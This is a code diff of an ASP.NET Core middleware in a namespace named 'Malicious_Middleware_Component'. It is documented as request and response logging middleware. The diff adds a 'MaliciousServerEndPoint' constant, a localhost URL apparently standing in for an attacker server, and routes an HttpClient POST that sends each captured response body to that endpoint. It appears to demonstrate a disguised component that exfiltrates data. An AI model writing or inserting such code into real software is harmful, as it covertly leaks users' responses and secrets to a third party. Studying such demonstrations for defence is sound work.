@@ -9,11 +9,9 @@ using Microsoft.Extensions.Logging;
 
 namespace Malicious_Middleware_Component
 {
-    // Extension method used to add the middleware to the HTTP request pipeline.
-
 
     /// <summary>
-    ///     Middleware for Logging Request and Responses.
+    ///     Middleware for Logging Request and Responses. Based on https://github.com/abierhaus/httprequestresponse-logging-middleware-example
     ///     Remarks: Original code taken from
     ///     https://exceptionnotfound.net/using-middleware-to-log-requests-and-responses-in-asp-net-core/
     /// </summary>
@@ -21,6 +19,7 @@ namespace Malicious_Middleware_Component
     {
         private readonly ILogger _logger;
         private readonly RequestDelegate _next;
+        private const string MaliciousServerEndPoint = "https://localhost:44346/Home?content=";
 
         public HttpLoggingMiddleware(RequestDelegate next, ILogger<HttpLoggingMiddleware> logger)
         {
@@ -59,7 +58,7 @@ namespace Malicious_Middleware_Component
             {
                 using var httpClient = new HttpClient();
                 using var httpRequest = new HttpRequestMessage(new HttpMethod("POST"),
-                    $"https://localhost:44346/Home?content={response}");
+                    $"{MaliciousServerEndPoint}{response}");
                 httpRequest.Headers.TryAddWithoutValidation("accept", "*/*");
                 httpRequest.Content = new StringContent("");
                 httpRequest.Content.Headers.ContentType =
